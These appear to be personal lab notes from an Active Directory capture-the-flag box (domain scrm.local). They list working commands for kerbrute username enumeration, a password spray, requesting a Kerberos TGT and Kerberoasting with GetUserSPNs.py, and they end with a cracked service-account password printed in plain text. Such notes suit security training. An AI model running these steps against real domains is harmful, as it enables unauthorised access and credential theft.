Nmap scan
13 ports open and seems to be a domain controller
Domain name of scrm.local

Check website.
Disabled NTLM auth.

Password reset is the same as username.

Two usernames
support and ksimpson

domain of scramblecorp.com

Check for valid usernames with kerbrute

```bash
/opt/kerbrute userenum -d scrm.local --dc dc1.scrm.local users.txt
```
Gives a valid username of ksimpson

Password spray with ksimpson as the password.

```bash
/opt/kerbrute passwordspray -d scrm.local --dc dc1.scrm.local users.txt ksimpson
```
This gives a valid login 

Use the login to get a TGT
```bash
sudo python3 getTGT.py scrm.local/ksimpson:ksimpson
```

Check for SPNs
```bash
python3 GetUserSPNs.py scrm.local/ksimpson:ksimpson -dc-host dc1.scrm.local -k -no-pass -request
```
Crack the hash
sqlsvc:Pegasus60
